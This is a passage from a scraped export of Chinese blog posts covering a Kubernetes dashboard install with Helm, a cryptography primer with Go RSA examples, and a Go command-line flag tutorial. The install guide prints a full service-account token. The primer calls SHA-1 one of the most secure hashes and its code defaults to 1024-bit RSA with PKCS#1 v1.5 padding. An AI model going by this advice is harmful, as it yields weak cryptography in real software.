./fenghhong.key --cert ./fenghong.cer # kubectl get secrets -n kube-system |grep qx qx-tls-secret kubernetes.io/tls 2 8h dashboard.yaml\ncat \u0026gt; dashboard.yml \u0026lt;\u0026lt; EOF image: repository: k8s.gcr.io/kubernetes-dashboard-amd64 tag: v1.10.1 ingress: enabled: true hosts: - k8s.fenghong.tech annotations: nginx.ingress.kubernetes.io/ssl-redirect: \u0026#34;true\u0026#34; nginx.ingress.kubernetes.io/backend-protocol: \u0026#34;HTTPS\u0026#34; tls: - secretName: qx-tls-secret #填写生成的secrets hosts: - k8s.fenghong.tech nodeSelector: node-role.kubernetes.io/edge: \u0026#39;\u0026#39; tolerations: - key: node-role.kubernetes.io/master operator: Exists effect: NoSchedule - key: node-role.kubernetes.io/master operator: Exists effect: PreferNoSchedule rbac: clusterAdminRole: true EOF 部署到dashboard\n$ helm install stable/kubernetes-dashboard \\ -n kubernetes-dashboard \\ --namespace kube-system \\ -f dashboard.yaml 查看授权token:\nkubectl describe -n kube-system secret $(kubectl -n kube-system get secret | grep kubernetes-dashboard-token |awk \u0026#39;{print $1}\u0026#39;) Name: dashboard-kubernetes-dashboard-token-fb7qg Namespace: kube-system Labels: \u0026lt;none\u0026gt; Annotations: kubernetes.io/service-account.name: dashboard-kubernetes-dashboard kubernetes.io/service-account.uid: f7eefc7a-1129-49d4-84eb-629dc1a90c08 Type: kubernetes.io/service-account-token Data ==== token: eyJhbGciOiJSUzI1NiIsImtpZCI6IiJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJpbmdyZXNzLW5naW54Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRhc2hib2FyZC1rdWJlcm5ldGVzLWRhc2hib2FyZC10b2tlbi1mYjdxZyIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50Lm5hbWUiOiJkYXNoYm9hcmQta3ViZXJuZXRlcy1kYXNoYm9hcmQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiJmN2VlZmM3YS0xMTI5LTQ5ZDQtODRlYi02MjlkYzFhOTBjMDgiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6aW5ncmVzcy1uZ2lueDpkYXNoYm9hcmQta3ViZXJuZXRlcy1kYXNoYm9hcmQifQ.f7TqF8CWpZJSUlhFyDPGwF21Em-Lx-BFJGZM_nsuF7FLkpBn0hxDmz8Hwtuho5WBegpDVRMuTzKk8odOpUikzvDmDkedjAQ0y_bDy1hDf1D2F8HKuBsbraZwPC9ep6VpvJ8h8AOIwFHIrw7C4p5ZmwrpXqcwVujmoUISpgCnQW0QhJJyAVAatowX8qxa9RDmHyQ4BG5_csGs7Mt0-pBsLNdAENMj6yw6IAGXRmZwO5XEZ5SFGeMBvSXRVnI2smeLqAtHnLKGevGjYu7M_DgU5K3Znp2ux1StJFFWrTqo1AP-D0XkcJ27DtA9Ccaqy09sh4WsZ_ekzHLA4u7IzChEgw ca.crt: 1025 bytes namespace: 13 bytes 验证:\n# 访问 https://k8s.fenghong.tech 即可,填写上面的token 安装metrics-server metrics-server的helm的chart管理yml文件\nargs: - --logtostderr - --kubelet-insecure-tls - --kubelet-preferred-address-types=InternalIP nodeSelector: node-role.kubernetes.io/edge: \u0026#39;\u0026#39; tolerations: - key: node-role.kubernetes.io/master operator: Exists effect: NoSchedule - key: node-role.kubernetes.io/master operator: Exists effect: PreferNoSchedule 部署:\n$ helm install stable/metrics-server \\  -n metrics-server \\  --namespace kube-system \\  -f metrics-server.yml 验证:\n$ kubectl top node NAME CPU(cores) CPU% MEMORY(bytes) MEMORY% master 127m 1% 3496Mi 14% node01 72m 0% 14468Mi 60% 如果没有利用ingress，客户端访问p12证书生成：\n$ cd ~/.kube $ grep \u0026#39;client-certificate-data\u0026#39; config |head -n 1 |awk \u0026#39;{print $2}\u0026#39; |base64 -d \u0026gt;\u0026gt; kubecfg.crt $ grep \u0026#39;client-key-data\u0026#39; config |head -n 1 |awk \u0026#39;{print $2}\u0026#39; |base64 -d \u0026gt;\u0026gt; kubecfg.key $ openssl pkcs12 -export -clcerts -inkey kubecfg.key -in kubecfg.crt -out kubecfg.p12 -name \u0026#34;kubernetes-web-client\u0026#34; 访问 https://192.168.18.11:6443/api/v1/namespaces/kube-system/services/https:kubernetes-dashboard:/proxy\n客户端选择证书的原理  证书选择是在客户端和服务端 SSL/TLS 握手协商阶段商定的； 服务端如果要求客户端提供证书，则在握手时会向客户端发送一个它接受的 CA 列表； 客户端查找它的证书列表(一般是操作系统的证书，对于 Mac 为 keychain)，看有没有被 CA 签名的证书，如果有，则将它们提供给用户选择（证书的私钥）； 用户选择一个证书私钥，然后客户端将使用它和服务端通信；  参考  TLS Secret证书管理  ","permalink":"https://www.fenghong.tech/blog/kubernetes/kubeadm-install-kubernetes1.15.3/","tags":["docker","nginxIngress","kubernetes","dashboard"],"title":"kubeadm 安装 kubernetes1.15.3"},{"categories":["algorithm","golang"],"contents":"[TOC]\n密码学简介与Golang的加密库Crypto的使用  据记载，公元前3200-1200年,古代埃及法老的墓上的象形文字\n公元前500, 斯巴达人在军事上用于加密,发明了\u0026quot;天书\u0026quot;密码(Scytale).,发送者把一条羊皮螺旋形缠绕在圆柱木棒上,核心就是置换.\n公元前400年，古希腊人发明了置换密码。\n公元前50年,古罗马凯撒发明Caesar密码,代替密码\n1881年世界上的第一个电话保密专利出现。\n1883年Kerckhoffs第一次明确的提出了密码编码的原则: 加密算法应该建立在算法的公开不影响明文和秘钥的安全,即密码算法的安全性仅依赖于对秘钥的保密.\n在第二次世界大战期间，德国军方启用“恩尼格玛”密码机，密码学在战争中起着非常重要的作用, 这段历史很有趣,建议看看恩格玛机破解历史,Enigma加密视频,Enigma解密视频。\n1949年,Shannon发表了\u0026quot;The Communication Theory of Secret Systems\u0026quot;这篇论文定义了理论安全性,提出了扩散和混淆原则,奠定了密码学的理论基础,密码学由艺术向科学科学的转变.\n1976年Diffie \u0026amp; Hellman的 \u0026ldquo;New Directions in Cryptography\u0026rdquo;,提出了公钥密码的概念.\n随着信息化和数字化社会的发展，人们对信息安全和保密的重要性认识不断提高，于是在1997年，美国国家标准局公布实施了“美国数据加密标准（DES）”，民间力量开始全面介入密码学的研究和应用中，采用的加密算法有DES、RSA、SHA等。随着对加密强度需求的不断提高，近期又出现了AES、ECC等。\n1994年,Shor提出了量子计算机模型下分解大整数和求离散对数的多项式时间算法.\n2000年,AES正式取代了DES成为了新的加密标准;\n后量子密码\u0026hellip;\n 密码分析学  密码攻击    穷举攻击: 通过试遍所有的秘钥来破译 统计分析攻击: 通过分析秘闻和明文的统计规律来破译 解密变换攻击: 针对加密变换的数学基础,通过数学求解设法找到解密变换    无条件安全和计算上安全    无论截获多少密文,都没有足够信息来确定唯一明文,则该密码是无条件安全 使用有效资源对一个密码系统进行分析而未破译,则改密码是强的或者计算是安全   密码学的目的  保密性：防止用户的标识或数据被读取。 数据完整性：防止数据被更改。 身份验证：确保数据发自特定的一方。  加密算法 根据密钥类型不同将现代密码技术分为两类：\n 对称加密算法: 加密和解密均采用同一把秘密钥匙。 非对称加密算法: 有2把密钥,公钥和私钥, 公钥加密, 私钥解密。  非对称加密 公钥加密,秘钥是成对出现的,公钥公开给所有人,私钥自己留存,用公钥加密数据，只能使用与之配对的私钥解密；反之亦然;\n RSA: 由RSA公司发明，是一个支持变长密钥的公共密钥算法，需要加密的文件块的长度也是可变的； DSA(Digital Signature Algorithm): 数字签名算法，是一种标准的DSS(数字签名标准)； ECC(Elliptic Curves Cryptography): 椭圆曲线密码编码学。 ECDSA(Elliptic Curve Digital Signature Algorithm): 基于椭圆曲线的DSA签名算法.  散列算法 散列是信息的提炼，通常其长度要比信息小得多，且为一个固定长度。加密性强的散列一定是不可逆的，这就意味着通过散列结果，无法推出任何部分的原始信息。任何输入信息的变化，哪怕仅一位，都将导致散列结果的明显变化，这称之为雪崩效应。散列还应该是防冲突的，即找不出具有相同散列结果的两条信息。具有这些特性的散列结果就可以用于验证信息是否被修改。常用于保证数据完整性 单向散列函数一般用于产生消息摘要，密钥加密等，常见的有：\n MD5(Message Digest Algorithm 5): 是RSA数据安全公司开发的一种单向散列算法。 SHA(Secure Hash Algorithm): 可以对任意长度的数据运算生成一个160位的数值；  MD5 MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一（又译摘要算法、哈希算法），主流编程语言普遍已有MD5实现。将数据（如汉字）运算为另一固定长度值，是杂凑算法的基础原理，MD5的前身有MD2、MD3和MD4\nSHA-1 在1993年，安全散列算法（SHA）由美国国家标准和技术协会(NIST)提出，并作为联邦信息处理标准（FIPS PUB 180）公布；1995年又发布了一个修订版FIPS PUB 180-1，通常称之为SHA-1。SHA-1是基于MD4算法的，并且它的设计在很大程度上是模仿MD4的。现在已成为公认的最安全的散列算法之一，并被广泛使用。 SHA-1是一种数据加密算法，该算法的思想是接收一段明文，然后以一种不可逆的方式将它转换成一段（通常更小）密文，也可以简单的理解为取一串输入码（称为预映射或信息），并把它们转化为长度较短、位数固定的输出序列即散列值（也称为信息摘要或信息认证代码）的过程。 该算法输入报文的最大长度不超过264位，产生的输出是一个160位的报文摘要。输入是按512 位的分组进行处理的。SHA-1是不可逆的、防冲突，并具有良好的雪崩效应。 sha1是SHA家族的五个算法之一(其它四个是SHA-224、SHA-256、SHA-384，和SHA-512)\nHMac Hmac算法也是一种哈希算法，它可以利用MD5或SHA1等哈希算法。不同的是，Hmac还需要一个密钥, 只要密钥发生了变化，那么同样的输入数据也会得到不同的签名，因此，可以把Hmac理解为用随机数“增强”的哈希算法。\npackage main import ( \u0026#34;crypto/hmac\u0026#34; \u0026#34;crypto/sha1\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; ) func main() { h := sha1.New() h.Write([]byte(\u0026#34;hello world\u0026#34;)) //sha1Hash散列 \tfmt.Printf(\u0026#34;%x\\n\u0026#34;, h.Sum(nil)) //sha1Hmac散列 \tfmt.Println(getHmacCode(\u0026#34;hello world\u0026#34;)) } func getHmacCode(s string) string { h := hmac.New(sha1.New, []byte(s)) _, _ = io.WriteString(h, s) return hex.EncodeToString(h.Sum(nil)) } SHA-1与MD5的比较 因为二者均由MD4导出，SHA-1和MD5彼此很相似。相应的，他们的强度和其他特性也是相似，但还有以下几点不同：\n 对强行供给的安全性：最显著和最重要的区别是SHA-1摘要比MD5摘要长32 位。使用强行技术，产生任何一个报文使其摘要等于给定报摘要的难度对MD5是2128数量级的操作，而对SHA-1则是2160数量级的操作。这样，SHA-1对强行攻击有更大的强度。 对密码分析的安全性：由于MD5的设计，易受密码分析的攻击，SHA-1显得不易受这样的攻击。 速度：在相同的硬件上，SHA-1的运行速度比MD5慢。  椭圆加密算法 DH DH全称是:Diffie-Hellman, 是一种确保共享KEY安全穿越不安全网络的方法，它是OAKLEY的一个组成部分。Whitefield与Martin Hellman在1976年提出了一个奇妙的密钥交换协议，称为Diffie-Hellman密钥交换协议/算法(Diffie-Hellman Key Exchange/Agreement Algorithm).这个机制的巧妙在于需要安全通信的双方可以用这个方法确定对称密钥。然后可以用这个密钥进行加密和解密。 DH依赖于计算离散对数的难度, 大概过程如下:\n 可以如下定义离散对数：首先定义一个素数p的原根，为其各次幂产生从1 到p-1的所有整数根，也就是说，如果a是素数p的一个原根，那么数值 a mod p,a2 mod p,…,ap-1 mod p 是各不相同的整数，并且以某种排列方式组成了从1到p-1的所有整数. 对于一个整数b和素数p的一个原根a，可以找到惟一的指数i，使得 b = a^i mod p 其中0 ≤ i ≤ （p-1） 指数i称为b的以a为基数的模p的离散对数或者指数.该值被记为inda,p(b).\n ECDH 全称是Elliptic Curve Diffie-Hellman, 是DH算法的加强版, 基于椭圆曲线难题加密, 现在是主流的密钥交换算法。 ECC是建立在基于椭圆曲线的离散对数的难度, 大概过程如下:\n 给定椭圆曲线上的一个点P，一个整数k，求解Q=kP很容易；给定一个点P、Q，知道Q=kP，求整数k确是一个难题。ECDH即建立在此数学难题之上\n 椭圆曲线算法因参数不同有多种类型, 这个网站列出了现阶段那些ECC是相对安全的:椭圆曲线算法安全列表, 而curve25519便是其中的佼佼者。 Curve25519/Ed25519/X25519是著名密码学家Daniel J. Bernstein在2006年独立设计的椭圆曲线加密/签名/密钥交换算法, 和现有的任何椭圆曲线算法都完全独立。 特点是：\n 完全开放设计: 算法各参数的选择直截了当，非常明确，没有任何可疑之处，相比之下目前广泛使用的椭圆曲线是NIST系列标准，方程的系数是使用来历不明的随机种子 c49d3608 86e70493 6a6678e1 139d26b7 819f7e90 生成的，非常可疑，疑似后门； 高安全性： 一个椭圆曲线加密算法就算在数学上是安全的，在实用上也并不一定安全，有很大的概率通过缓存、时间、恶意输入摧毁安全性，而25519系列椭圆曲线经过特别设计，尽可能的将出错的概率降到了最低，可以说是实践上最安全的加密算法。例如，任何一个32位随机数都是一个合法的X25519公钥，因此通过恶意数值攻击是不可能的，算法在设计的时候刻意避免的某些分支操作，这样在编程的时候可以不使用if ，减少了不同if分支代码执行时间不同的时序攻击概率，相反， NIST系列椭圆曲线算法在实际应用中出错的可能性非常大，而且对于某些理论攻击的免疫能力不高， Bernstein 对市面上所有的加密算法使用12个标准进行了考察， 25519是几乎唯一满足这些标准的 http://t.cn/RMGmi1g ； 速度快: 25519系列曲线是目前最快的椭圆曲线加密算法，性能远远超过NIST系列，而且具有比P-256更高的安全性； 作者功底深厚: Daniel J. Bernstein是世界著名的密码学家，他在大学曾经开设过一门 UNIX 系统安全的课程给学生，结果一学期下来，发现了 UNIX 程序中的 91 个安全漏洞；他早年在美国依然禁止出口加密算法时，曾因为把自己设计的加密算法发布到网上遭到了美国政府的起诉，他本人抗争六年，最后美国政府撤销所有指控，目前另一个非常火的高性能安全流密码 ChaCha20 也是出自 Bernstein 之手； 下一代的标准: 25519系列曲线自2006年发表以来，除了学术界无人问津， 2013 年爱德华·斯诺登曝光棱镜计划后，该算法突然大火，大量软件，如OpenSSH都迅速增加了对25519系列的支持，如今25519已经是大势所趋，可疑的NIST曲线迟早要退出椭圆曲线的历史舞台，目前， RFC增加了SSL/TLS对X25519密钥交换协议的支持，而新版 OpenSSL 1.1也加入支持，是摆脱老大哥的第一步，下一步是将 Ed25519做为可选的TLS证书签名算法，彻底摆脱NIST 这里需要指出下golang的标准库的crypto里的椭圆曲线实现了这4种(elliptic文档): P224/P256/P384/P521, 而curve25519是单独实现的, 他不在标准库中: golang.org/x/crypto/curve25519  go 加密解密之RSA  安全之道,对应通用的加密算法,很多语言都有实现. 对于RSA算法本身,请自行google.\n在1976年，由于对称加密算法已经不能满足需要，Diffie 和Hellman发表了一篇叫《密码学新动向》的文章，介绍了公匙加密的概念，由Rivet、Shamir、Adelman提出了RSA算法。 RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准。\n本文讨论的Go RSA,均在win10操作系统上完成\n 概要 RSA是一个非对称加密算法,通过公钥加密,私钥解密.\n$ openssl genrsa -out private.pem 1024 $ openssl rsa -in private.pem -pubout -out public.pem 这样,便生成了秘钥,当然很多工具都提高了RSA的秘钥生成方法,编程语言大部分也提供了API来生成.加密解密涉及很多标准,需要的时候可以去临时学一下.\nGO生成RSA 这里提供golang方法来生成,思路如下:\n private.pem生成  在crypto/rsa包中有一个函数：\n func GenerateKey(random io.Reader, bits int) (priv *PrivateKey, err error)\n  官方解释 : GenerateKey generates an RSA keypair of the given bit size using the random source random (for example, crypto/rand.Reader).\n 该函数中，random可以直接传crypto/rand中的rand.Reader，而bits是密钥长度。\n这样得到了一个PrivateKey类型的指针\ntype PrivateKey struct { PublicKey // public part. \tD *big.Int // private exponent \tPrimes []*big.Int // prime factors of N, has \u0026gt;= 2 elements.  // Precomputed contains precomputed values that speed up private \t// operations, if available. \tPrecomputed PrecomputedValues } // A PublicKey represents the public part of an RSA key. type PublicKey struct { N *big.Int // modulus \tE int // public exponent } 得到*PrivateKey指针后,MarshalPKCS1PrivateKey生成一个ASN.1的加密form.\n func MarshalPKCS1PrivateKey(key *rsa.PrivateKey) []byte \n  官方解释: MarshalPKCS1PrivateKey converts a private key to ASN.1 DER encoded form.\n 将加密的ASN.1存入Block里面,Block是pem包里面的一个结构体,是标准的PEM格式,一个block代表的是PEM编码的结构，关于PEM，请查阅相关资料,有三个参数,一个是Type,是一个string类型, Bytes即我们刚才得到的ANS.1的DER字节切片.其实这里的秘钥已经生成完毕.\n// A Block represents a PEM encoded structure. // // The encoded form is: // -----BEGIN Type----- // Headers // base64-encoded Bytes // -----END Type----- // where Headers is a possibly empty sequence of Key: Value lines. type Block struct { Type string // The type, taken from the preamble (i.e. \u0026#34;RSA PRIVATE KEY\u0026#34;). \tHeaders map[string]string // Optional headers. \tBytes []byte // The decoded bytes of the contents. Typically a DER encoded ASN.1 structure. } 将其写入文件,生成文件句柄,将block写入文件即可,这里利用pem包里面的Encode方法.私钥生成完毕.\n// Encode writes the PEM encoding of b to out. func Encode(out io.Writer, b *Block) error  public.pem生成  在生成*PrivateKey秘钥的时候,这个结构体已经含有了PublicKey这个结构了,需要对PublicKey导出的格式进行定义,这里有两种导出格式: PKCS#1, ASN.1 DER form 和 DER-encoded PKIX,都是可以操作的.这里演示前者即ASN.1 DER\n func MarshalPKCS1PublicKey(key *rsa.PublicKey) []byte\n  官方解释: MarshalPKCS1PublicKey converts an RSA public key to PKCS#1, ASN.1 DER form.\n  func MarshalPKIXPublicKey(pub interface{}) ([]byte, error) \n  官方解释: MarshalPKIXPublicKey serialises a public key to DER-encoded PKIX format.\n 生成好PKCS#1, ASN.1 DER form格式之后,将其存入block里面,不过这次的Type为\u0026quot;PUBLIC KEY\u0026quot;,之后,生成文件句柄,将block写入文件即可,这里同样利用pem包里面的Encode方法.私钥生成完毕.\n完整代码如下:\n/* @Time : 2019/8/31 22:40 @Author : louis @File : rsaGenerate @Software: GoLand */ package main import ( \u0026#34;crypto/rand\u0026#34; \u0026#34;crypto/rsa\u0026#34; \u0026#34;crypto/x509\u0026#34; \u0026#34;encoding/pem\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;log\u0026#34; \u0026#34;os\u0026#34; ) func generateKey(bits int, path string) (err error) { privateKey, err := rsa.GenerateKey(rand.Reader, bits) if err != nil { return err } // MarshalPKCS1PrivateKey converts a private key to ASN.1 DER encoded form. \tderStream := x509.MarshalPKCS1PrivateKey(privateKey) block := \u0026amp;pem.Block{ Type: \u0026#34;RSA PRIVATE KEY\u0026#34;, Bytes: derStream, } // file,err := os.OpenFile(name,O_RDWR|O_CREATE|O_TRUNC, 0666) \tfile, err := os.Create(path + \u0026#34;private.pem\u0026#34;) if err != nil { return err } defer file.Close() err = pem.Encode(file, block) if err != nil { return err } publicKey := \u0026amp;privateKey.PublicKey // MarshalPKIXPublicKey serialises a public key to DER-encoded PKIX format. \t//derPub, err := x509.MarshalPKIXPublicKey(publicKey) \t// MarshalPKCS1PublicKey converts an RSA public key to PKCS#1, ASN.1 DER form. \tderPub := x509.MarshalPKCS1PublicKey(publicKey) block = \u0026amp;pem.Block{ Type: \u0026#34;PUBLIC KEY\u0026#34;, Bytes: derPub, } pubFile, err := os.Create(path + \u0026#34;public.pem\u0026#34;) if err != nil { return err } //pubFile1, err := os.Create(\u0026#34;sshgo/public1.pem\u0026#34;) \t//if err != nil { \t//\tlog.Fatalln(err) \t//} \terr = pem.Encode(pubFile, block) if err != nil { return err } //err = pem.Encode(pubFile1,block1) \t//if err != nil { \t//\tlog.Fatalln(err) \t//} \treturn nil } func main() { var bits int var path string flag.IntVar(\u0026amp;bits, \u0026#34;b\u0026#34;, 1024, \u0026#34;rsa key length\u0026#34;) flag.StringVar(\u0026amp;path,\u0026#34;p\u0026#34;,\u0026#34;sshgo/\u0026#34;,\u0026#34;rsa key path\u0026#34;) if err := generateKey(bits, path); err != nil { log.Fatalln(\u0026#34;rsa generate failed\u0026#34;) } log.Println(\u0026#34;rsa key generate success\u0026#34;) } GO加密解密数据 如何利用PublicKey和PrivateKey来实现加密解密呢?\n 加密(利用pubKey加密)  在上面生成秘钥的时候用到了一个pem.Encode方法,相应的是不是有pem.Decode方法呢?还真必须有~~\n// Decode will find the next PEM formatted block (certificate, private key // etc) in the input. It returns that block and the remainder of the input. If // no PEM data is found, p is nil and the whole of the input is returned in // rest. func Decode(data []byte) (p *Block, rest []byte) {} 将秘钥文件读取,ioutil.ReadFile这个方法,返回[]byte error 即可完美衔接Decode方法,得到*block指针.\n得到指针又该如何使用呢?前面已经说过,block结构里面有Bytes字段,是一个form结构,比如PKCS#1, ASN.1 DER form 和 DER-encoded PKIX,依旧利用前者,如果你的PublicKey利用ASN.1生成的,就选择相应的方法进行分解. 这个方法在crypto/x509\n 官方解释: ParsePKCS1PublicKey parses a PKCS#1 public key in ASN.1 DER form.\n  func ParsePKCS1PublicKey(der []byte) (*rsa.PublicKey, error)\n // ParsePKIXPublicKey parses a DER encoded public key. These values are // typically found in PEM blocks with \u0026#34;BEGIN PUBLIC KEY\u0026#34;. // // Supported key types include RSA, DSA, and ECDSA. Unknown key // types result in an error. // // On success, pub will be of type *rsa.PublicKey, *dsa.PublicKey, // or *ecdsa.PublicKey. func ParsePKIXPublicKey(derBytes []byte) (pub interface{}, err error) //如果采用这个方法,请记得用类型断言一下,比如 // pub.(*rsa.PublicKey) 获得*rsa.PublicKey后,利用EncryptPKCS1v15即可完成加密.返回一个[]byte,字节切片.解密过程原理一直\n// EncryptPKCS1v15 encrypts the given message with RSA and the padding // scheme from PKCS#1 v1.5. The message must be no longer than the // length of the public modulus minus 11 bytes. // // The rand parameter is used as a source of entropy to ensure that // encrypting the same message twice doesn\u0026#39;t result in the same // ciphertext. // // WARNING: use of this function to encrypt plaintexts other than // session keys is dangerous. Use RSA OAEP in new protocols. func EncryptPKCS1v15(rand io.Reader, pub *PublicKey, msg []byte) ([]byte, error)  完整代码  /* @Time : 2019/8/31 11:58 @Author : louis @File : rsaEnDecode @Software: GoLand */ package main import ( \u0026#34;crypto/rand\u0026#34; \u0026#34;crypto/rsa\u0026#34; \u0026#34;crypto/x509\u0026#34; \u0026#34;encoding/base64\u0026#34; \u0026#34;encoding/pem\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; ) //怎么将openssl生成的密钥文件解析到公钥和私钥实例呢？  //rsaEncrypt 加密数据 func rsaEncrypt(ori string) ([]byte, error) { //data, err := ioutil.ReadFile(\u0026#34;sshgo/public.pem\u0026#34;) \tdata, err := ioutil.ReadFile(\u0026#34;sshgo/public.pem\u0026#34;) if err != nil { return nil, err } block, _ := pem.Decode(data) if block == nil { return nil, err } //pubIn, err := x509.ParsePKIXPublicKey(block.Bytes) \tpub, err := x509.ParsePKCS1PublicKey(block.Bytes) if err != nil { return nil, err } //pub := pubIn.(*rsa.PublicKey) \treturn rsa.EncryptPKCS1v15(rand.Reader, pub, []byte(ori)) } func rsaDecrypt(encrypt []byte) ([]byte, error) { data, err := ioutil.ReadFile(\u0026#34;sshgo/private.pem\u0026#34;) if err != nil { return nil, err } block, _ := pem.Decode(data) priv,err := x509.ParsePKCS1PrivateKey(block.Bytes) if err != nil { return nil, err } return rsa.DecryptPKCS1v15(rand.Reader,priv,encrypt) } func main() { data, err := rsaEncrypt(\u0026#34;hello golang!\u0026#34;) if err != nil { log.Fatalln(err) } fmt.Println(\u0026#34;rsa encrypt base64:\u0026#34;,base64.StdEncoding.EncodeToString(data)) orig,err := rsaDecrypt(data) if err != nil { log.Fatalln(err) } fmt.Println(string(orig)) } 参考   大佬的blog\n  polaris\n  ","permalink":"https://www.fenghong.tech/blog/algorithm/go-crypto/","tags":["hash","rsa","ssh","crypto"],"title":"go encrypt\u0026decrypt"},{"categories":["golang"],"contents":"[TOC]\nflag - 命令行参数解析 在写命令行程序（工具、server）时，对命令参数进行解析是常见的需求。各种语言一般都会提供解析命令行参数的方法或库，以方便程序员使用。如果命令行参数纯粹自己写代码解析，对于比较复杂的，还是挺费劲的。在 go 标准库中提供了一个包：flag，方便进行命令行解析。\n注：区分几个概念\n 命令行参数（或参数）：是指运行程序提供的参数 已定义命令行参数：是指程序中通过flag.Xxx等这种形式定义了的参数 非flag（non-flag）命令行参数（或保留的命令行参数）：后文解释  1.1. 使用示例 我们以 nginx 为例，执行 nginx -h，输出如下：\n$ nginx -h nginx version: nginx/1.12.2 Usage: nginx [-?hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives] Options: -?,-h : this help -v : show version and exit -V : show version and configure options then exit -t : test configuration and exit -T : test configuration, dump it and exit -q : suppress non-error messages during configuration testing -s signal : send signal to a master process: stop, quit, reopen, reload -p prefix : set prefix path (default: /usr/share/nginx/) -c filename : set configuration file (default: /etc/nginx/nginx.conf) -g directives : set global directives out of configuration file 我们通过 flag 实现类似 nginx 的这个输出，创建文件 nginx.go，内容如下：\npackage main import ( \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;os\u0026#34; ) // 实际中应该用更好的变量名 var ( h bool v, V bool t, T bool q *bool s string p string c string g string ) func init() { flag.BoolVar(\u0026amp;h, \u0026#34;h\u0026#34;, false, \u0026#34;this help\u0026#34;) flag.BoolVar(\u0026amp;v, \u0026#34;v\u0026#34;, false, \u0026#34;show version and exit\u0026#34;) flag.BoolVar(\u0026amp;V, \u0026#34;V\u0026#34;, false, \u0026#34;show version and configure options then exit\u0026#34;) flag.BoolVar(\u0026amp;t, \u0026#34;t\u0026#34;, false, \u0026#34;test configuration and exit\u0026#34;) flag.BoolVar(\u0026amp;T, \u0026#34;T\u0026#34;, false, \u0026#34;test configuration, dump it and exit\u0026#34;) // 另一种绑定方式  q = flag.Bool(\u0026#34;q\u0026#34;, false, \u0026#34;suppress non-error messages during configuration testing\u0026#34;) // 注意 `signal`。默认是 -s string，有了 `signal` 之后，变为 -s signal  flag.StringVar(\u0026amp;s, \u0026#34;s\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;send `signal` to a master process: stop, quit, reopen, reload\u0026#34;) flag.StringVar(\u0026amp;p, \u0026#34;p\u0026#34;, \u0026#34;/usr/local/nginx/\u0026#34;, \u0026#34;set `prefix` path\u0026#34;) flag.StringVar(\u0026amp;c, \u0026#34;c\u0026#34;, \u0026#34;conf/nginx.conf\u0026#34;, \u0026#34;set configuration `filename`\u0026#34;) flag.StringVar(\u0026amp;g, \u0026#34;g\u0026#34;, \u0026#34;conf/nginx.conf\u0026#34;, \u0026#34;set global `directives` out of configuration file\u0026#34;) // 改变默认的 Usage  flag.Usage = usage } func main() { flag.Parse() if h { flag.Usage() } } func usage() { fmt.Fprintf(os.Stderr, `nginx version: nginx/1.12.2 Usage: nginx [-hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives] Options: `) flag.PrintDefaults() } 执行：go run nginx.go -h，（或 go build -o nginx \u0026amp;\u0026amp; ./nginx -h）输出如下：\nnginx version: nginx/1.12.2 Usage: nginx [-hvVtTq] [-s signal] [-c filename] [-p prefix] [-g directives] Options: -T test configuration, dump it and exit -V show version and configure options then exit -c file set configuration file (default \u0026quot;conf/nginx.conf\u0026quot;) -g directives set global directives out of configuration file (default \u0026quot;conf/nginx.conf\u0026quot;) -h this help -p prefix set prefix path (default \u0026quot;/usr/local/nginx/\u0026quot;) -q suppress non-error messages during configuration testing -s signal send signal to a master process: stop, quit, reopen, reload -t test configuration and exit -v show version and exit 仔细理解以上例子，如果有不理解的，看完下文的讲解再回过头来看。\nflag 包概述 flag 包实现了命令行参数的解析。\n定义 flags 有两种方式 1）flag.Xxx()，其中 Xxx 可以是 Int、String 等；返回一个相应类型的指针，如：\nvar ip = flag.Int(\u0026quot;flagname\u0026quot;, 1234, \u0026quot;help message for flagname\u0026quot;) 2）flag.XxxVar()，将 flag 绑定到一个变量上，如：\nvar flagvar int flag.IntVar(\u0026amp;flagvar, \u0026#34;flagname\u0026#34;, 1234, \u0026#34;help message for flagname\u0026#34;) 自定义 Value 另外，还可以创建自定义 flag，只要实现 flag.Value 接口即可（要求 receiver 是指针），这时候可以通过如下方式定义该 flag：\nflag.Var(\u0026amp;flagVal, \u0026quot;name\u0026quot;, \u0026quot;help message for flagname\u0026quot;) 例如，解析接收到的电话号码，我们希望直接解析到 slice 中，我们可以定义如下 Value：\ntype Receives []string func newReceives(vals []string, r *[]string) *Receives { *r = vals return (*Receives)(r) } func (r *Receives) Set(value string) error { if len(*r) \u0026gt;0 { return errors.New(\u0026#34;interval flag already set\u0026#34;) } for _,dt :=range strings.Split(value, \u0026#34;,\u0026#34;) { *r = append(*r ,dt) } return nil } func (r *Receives) Get() interface{} { return []string(*r) } func (r *Receives) String() string { return fmt.Sprint(*r) } 之后可以这么使用：\nvar receievs []string flag.Var(newSliceValue([]string{}, \u0026amp;receievs), \u0026quot;r\u0026quot;, \u0026quot;receievs\u0026quot;) 这样通过 -r \u0026quot;123,456\u0026quot; 这样的形式传递参数，languages 得到的就是 [123,456]。\nflag 中对 Duration 这种非基本类型的支持，使用的就是类似这样的方式。\n1.2.3. 解析 flag 在所有的 flag 定义完成之后，可以通过调用 flag.Parse() 进行解析。\n命令行 flag 的语法有如下三种形式：\n-flag // 只支持bool类型 -flag=x -flag x // 只支持非bool类型 其中第三种形式只能用于非 bool 类型的 flag，原因是：如果支持，那么对于这样的命令 cmd -x 